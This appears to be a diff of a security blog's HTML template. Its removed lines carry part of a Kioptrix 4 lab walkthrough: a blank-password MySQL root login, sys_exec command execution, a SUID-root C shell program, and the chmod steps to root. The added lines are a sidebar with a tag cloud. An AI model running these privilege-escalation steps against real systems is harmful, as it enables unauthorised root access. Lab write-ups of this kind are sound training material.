-root         4  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [ksoftirqd/0]
-root         5  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [watchdog/0]
-root         6  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [events/0]
-root         7  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [khelper]
-root        41  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kblockd/0]
-root        44  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kacpid]
-root        45  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kacpi_notify]
-root       180  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kseriod]
-root       219  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
-root       220  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
-root       221  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kswapd0]
-root       263  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [aio/0]
-root      1489  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [ata/0]
-root      1492  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [ata_aux]
-root      1501  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [scsi_eh_0]
-root      1502  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [scsi_eh_1]
-root      1520  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [ksuspend_usbd]
-root      1526  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [khubd]
-root      2401  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [scsi_eh_2]
-root      2641  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kjournald]
-root      2808  0.0  0.0   2224   652 ?        S&lt;s  Feb11   0:00 /sbin/udevd --daemon
-root      3099  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kgameportd]
-root      3236  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kpsmoused]
-root      3974  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [btaddconn]
-root      3978  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [btdelconn]
-root      4614  0.0  0.0   1716   488 tty4     Ss+  Feb11   0:00 /sbin/getty 38400 tty4
-root      4616  0.0  0.0   1716   488 tty5     Ss+  Feb11   0:00 /sbin/getty 38400 tty5
-root      4622  0.0  0.0   1716   484 tty2     Ss+  Feb11   0:00 /sbin/getty 38400 tty2
-root      4626  0.0  0.0   1716   488 tty3     Ss+  Feb11   0:00 /sbin/getty 38400 tty3
-root      4630  0.0  0.0   1716   488 tty6     Ss+  Feb11   0:00 /sbin/getty 38400 tty6
-syslog    4663  0.0  0.0   1936   652 ?        Ss   Feb11   0:00 /sbin/syslogd -u syslog
-root      4682  0.0  0.0   1872   540 ?        S    Feb11   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
-klog      4684  0.0  0.1   3160  2064 ?        Ss   Feb11   0:00 /sbin/klogd -P /var/run/klogd/kmsg
-root      4703  0.0  0.0   5316   988 ?        Ss   Feb11   0:00 /usr/sbin/sshd
-root      4759  0.0  0.0   1772   524 ?        S    Feb11   0:00 /bin/sh /usr/bin/mysqld_safe
-root      4876  0.0  0.1   6528  1332 ?        Ss   Feb11   0:00 /usr/sbin/nmbd -D
-root      4878  0.0  0.2  10108  2544 ?        Ss   Feb11   0:00 /usr/sbin/smbd -D
-root      4892  0.0  0.0  10108  1028 ?        S    Feb11   0:00 /usr/sbin/smbd -D
-root      4893  0.0  0.1   8084  1336 ?        Ss   Feb11   0:00 /usr/sbin/winbindd
-root      4900  0.0  0.1   8084  1160 ?        S    Feb11   0:00 /usr/sbin/winbindd
-daemon    4914  0.0  0.0   1984   472 ?        Ss   Feb11   0:00 /usr/sbin/atd
-root      4925  0.0  0.0   2104   884 ?        Ss   Feb11   0:00 /usr/sbin/cron
-root      4947  0.0  0.5  20464  6188 ?        Ss   Feb11   0:01 /usr/sbin/apache2 -k start
-www-data  4979  0.0  0.5  20596  5700 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-www-data  4980  0.0  0.5  20596  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-www-data  4981  0.0  0.5  20612  5604 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-www-data  4982  0.0  0.5  20612  5684 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-www-data  4983  0.0  0.5  20612  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-dhcp      4996  0.0  0.0   2440   792 ?        Ss   Feb11   0:00 dhclient eth1
-root      5003  0.0  0.0   1716   492 tty1     Ss+  Feb11   0:00 /sbin/getty 38400 tty1
-www-data  5015  0.0  0.5  20612  5628 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-www-data  5019  0.0  0.5  20856  5832 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
-root      5486  0.0  0.0   8084   868 ?        S    Feb11   0:00 /usr/sbin/winbindd
-root      5487  0.0  0.1   8092  1260 ?        S    Feb11   0:00 /usr/sbin/winbindd
-root      5488  0.0  0.3  11360  3736 ?        Ss   Feb11   0:00 sshd: john [priv]
-john      5490  0.0  0.1  11512  1912 ?        S    Feb11   0:00 sshd: john@pts/0 
-john      5491  0.0  0.3   5888  3796 pts/0    Ss   Feb11   0:00 python /bin/kshell
-john      5492  0.0  0.0   1772   488 pts/0    S    Feb11   0:00 sh -c /bin/bash
-john      5493  0.0  0.2   5444  2892 pts/0    S    Feb11   0:00 /bin/bash
-libuuid   6315  0.0  0.0   2004   300 ?        Ss   Feb11   0:00 uuidd
-root     11581  0.5  1.9 126992 20404 ?        Sl   Feb11   0:14 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=330
-root     11583  0.0  0.0   1700   560 ?        S    Feb11   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
-root     11663  0.0  0.0   1564   296 pts/0    S    Feb11   0:00 ./exploit
-root     11664  0.0  0.0   1772   484 pts/0    S    Feb11   0:00 sh -c /bin/bash
-root     11665  0.0  0.2   4924  2572 pts/0    S+   Feb11   0:00 /bin/bash
-root     11725  0.0  0.3  11360  3720 ?        Ss   00:16   0:00 sshd: john [priv]
-john     11727  0.0  0.1  11512  1872 ?        R    00:16   0:00 sshd: john@pts/1 
-john     11728  0.0  0.3   5964  3844 pts/1    Ss   00:16   0:00 python /bin/kshell
-john     11732  0.0  0.0   1772   484 pts/1    S    00:20   0:00 sh -c /bin/bash
-john     11733  0.0  0.2   5432  2852 pts/1    R    00:20   0:00 /bin/bash
-john     11754  0.0  0.0   2644  1008 pts/1    R+   00:22   0:00 ps aux
-</code></pre>
-
-<p>I couldn&rsquo;t help but notice that MySQL was running as &ldquo;root&rdquo;.  This is typically a no-no, so I attempted to make it my target.  I attempted to login with the root user, and a blank password:</p>
-
-<pre><code>john@Kioptrix4:~$ mysql -u root -h localhost
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 4999
-Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
-
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql&gt;
-</code></pre>
-
-<p>I figured if it was running as root, I would try running some system commands.</p>
-
-<pre><code>mysql&gt; SELECT sys_exec('touch /tmp/thisisatest');
-+------------------------------------+
-| sys_exec('touch /tmp/thisisatest') |
-+------------------------------------+
-| NULL                               | 
-+------------------------------------+
-1 row in set (0.00 sec)
-</code></pre>
-
-<p>And then to verify that it ran successfully:</p>
-
-<pre><code>john@Kioptrix4:~$ ls -al /tmp
-total 12
-drwxrwxrwt  3 root root 4096 2012-02-12 00:28 .
-drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
--rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
-drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
-</code></pre>
-
-<p>That was a very good sign!  I decided my method of exploitation would be to use a C program, set it to SUID root, and run it.  I used this C program that I have used many times before.</p>
-
-<pre><code>int main()
-{
-    setresuid(0, 0, 0);
-    setresgid(0, 0, 0);
-    system( &quot;/bin/bash&quot; );
-    return 0;
-}
-</code></pre>
-
-<p>I then compiled it.  Note that gcc was not installed, and cpp gave me issues, so I compiled it on the BackTrack VM, and then SFTP&rsquo;d the file over.</p>
-
-<pre><code>root@bt:~# gcc -o exploit exploit.c
-</code></pre>
-
-<pre><code>john@Kioptrix4:/tmp$ scp root@192.168.95.136:exploit exploit
-root@192.168.95.136's password: 
-exploit
-</code></pre>
-
-<p>I then used MySQL to set it to SUID and executable.  Before that, I&rsquo;d have to chown it to root, so that the SUID would actually be useful.</p>
-
-<pre><code>john@Kioptrix4:/tmp$ mysql -u root -h localhost
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 5001
-Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
-
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql&gt; SELECT sys_exec('chown root.root /tmp/exploit');
-+------------------------------------------+
-| sys_exec('chown root.root /tmp/exploit') |
-+------------------------------------------+
-| NULL                                     | 
-+------------------------------------------+
-1 row in set (0.01 sec)
-
-mysql&gt; SELECT sys_exec('chmod +s,a+rwx /tmp/exploit');
-+-----------------------------------------+
-| sys_exec('chmod +s,a+rwx /tmp/exploit') |
-+-----------------------------------------+
-| NULL                                    | 
-+-----------------------------------------+
-1 row in set (0.00 sec)
-</code></pre>
-
-<p>The /tmp folder now looked like this:</p>
-
-<pre><code>john@Kioptrix4:/tmp$ ls -al
-total 20
-drwxrwxrwt  3 root root 4096 2012-02-12 00:31 .
-drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
--rwsrwsrwx  1 root root  166 2012-02-12 00:31 exploit
--rw-r--r--  1 john john  103 2012-02-12 00:31 exploit.c
--rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
-drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
-</code></pre>
-
-<p>From there, it was just as simple as running the exploit.</p>
-
-<pre><code>john@Kioptrix4:/tmp$ ./exploit 
-root@Kioptrix4:/tmp# id
-uid=0(root) gid=0(root) groups=1001(john)
-root@Kioptrix4:/tmp# whoami
-root
-</code></pre>
-
-<p>And there you have it, root access!</p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
